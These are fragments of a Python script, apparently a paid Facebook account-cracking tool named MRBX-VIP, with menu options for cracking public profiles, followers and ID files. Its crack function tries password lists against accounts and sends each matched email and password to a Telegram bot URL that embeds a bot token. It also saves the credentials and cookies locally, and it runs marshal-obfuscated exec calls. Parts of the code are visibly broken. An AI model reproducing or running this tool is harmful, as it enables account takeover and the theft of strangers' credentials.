...
def chk():
  ...
  try: 
    ...
    httpCaht = requests.get("https://raw.githubusercontent.com/mstomastr/tool-VIP-/main/Tool%20VIP%20active").text 
    ...
    if id in httpCaht: 
      ...
      print('')
      print('\033[0;96m TOOL NOT FREE PAID $5 FOR ONE MONTH')
      print('')
      print("\033[0;96m BO ID ACTIVE KRDN @TERORST_709") 
...
def login_bas():
	try:
		...
		print(f' Good python MRBX-VIP.py ! ');time.sleep(1)
		os.system("python MRBX-VIP.py")
		exit()
	except Exception as e:
...
def menu(my_name):
	...
	print("")
	print("")
	print('\033[1;31m%s %s\033[1;32m01%s%s \033[1;32mCRACK PUBLIC %s%s%s'%(P,H,P,H,P,H,P))
	print('\033[1;31m%s %s\033[1;32m02%s%s \033[1;32mCRACK PUBLIC (MULTI) %s%s%s'%(P,H,P,H,P,H,P))	
	print('\033[1;37m%s %s\033[1;32m03%s%s \033[1;32mCRACK FOLLOWERS %s%s%s'%(P,H,P,H,P,H,P))	
	print('\033[1;37m%s %s\033[1;32m04%s%s \033[1;32mCRACK FILE %s%s%s'%(P,H,P,H,P,H,P))	
	print('\033[1;37m%s %s\033[1;32m05%s%s \033[1;32mMY TELEGRAM %s%s%s'%(P,H,P,H,P,H,P))	
	print('\033[1;34m%s %s\033[1;32m00%s%s \033[1;32mEXIT %s%s%s'%(P,H,P,H,P,H,P))
	print("")
	...
	if SAW in ['1','01']:
		...
		follower()
		exec(marshal.loads(b"\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\xf3.\x00\x00\x00\x97\x00d\x00d\x01l\x00Z\x00\x02\x00e\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00d\x02\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x01S\x00)\x03\xe9\x00\x00\x00\x00Nz'xdg-open  https://instagram.com/127.122)\x02\xda\x02os\xda\x06system\xa9\x00\xf3\x00\x00\x00\x00\xda\x00\xfa\x08<module>r\x08\x00\x00\x00\x01\x00\x00\x00s'\x00\x00\x00\xf0\x03\x01\x01\x01\xd8\x00\t\x80\t\x80\t\x80\t\xd8\x00\t\x80\x02\x84\t\xd0\n3\xd1\x004\xd4\x004\xd0\x004\xd0\x004\xd0\x004r\x06\x00\x00\x00"))
	elif SAW in ['4','04']:
		TakeFile()
		exec(marshal.loads(b"\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\xf3.\x00\x00\x00\x97\x00d\x00d\x01l\x00Z\x00\x02\x00e\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00d\x02\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x01S\x00)\x03\xe9\x00\x00\x00\x00Nz'xdg-open  https://instagram.com/127.___)\x02\xda\x02os\xda\x06system\xa9\x00\xf3\x00\x00\x00\x00\xda\x00\xfa\x08<module>r\x08\x00\x00\x00\x01\x00\x00\x00s'\x00\x00\x00\xf0\x03\x01\x01\x01\xd8\x00\t\x80\t\x80\t\x80\t\xd8\x00\t\x80\x02\x84\t\xd0\n3\xd1\x004\xd4\x004\xd0\x004\xd0\x004\xd0\x004r\x06\x00\x00\x00"))
	elif SAW in ['5','05']:
...
def setting():
	...
	2 = turenew.facebook.com 
	3 = rebor.facebook.com
	4 = tour.facebook.com
	5 = RTR.facebook.com
    6 = ENTR .NOT
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r [MRBX] {P}[{k}{loop}{P}/{h}{len(id)}{P}] - {P}{H}OK - {ok}{P} : {P}{k}\033[1;31mCP - \033[1;31m{cp}{x} : {bo}{'{:.0%}'.format(loop/float(len(id)))}{P}  "),
	sys.stdout.flush()
...
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r [MRBX] {P}[{k}{loop}\033[1;31m{P}/{h}{len(id)}{P}] - {P}{H}OK - {ok}{P} : {P}\033[1;31mCP - {cp}{x} : {bo}{'{:.0%}'.format(loop/float(len(id)))}{P}  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				requests.get(f"https://api.telegram.org/6077149439:AAFlwNjf1-Xfr8WqoQYkAJmmdd0NpgQ7kt8{idf}|{pw}\n {ip} @Crackingf_bot ")
				print(f'\r{H}\n[ MRBX-OK ]\n EMAIL : {idf}\n PASSWORD : {pw}\n{N} COOKIE S: {kuki}')
				#saw
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				break
...
def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r[MRBX] {P} {asu}Mbasic{P}{P}{b}{loop}{P}/{p}{len(id)}{P}—{P}[{H}--{ok} : {P}]—{P}[{k} : {cp}-{x}]—{m}{'{:.0%}'.format(loop/float(len(id)))}{P}  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
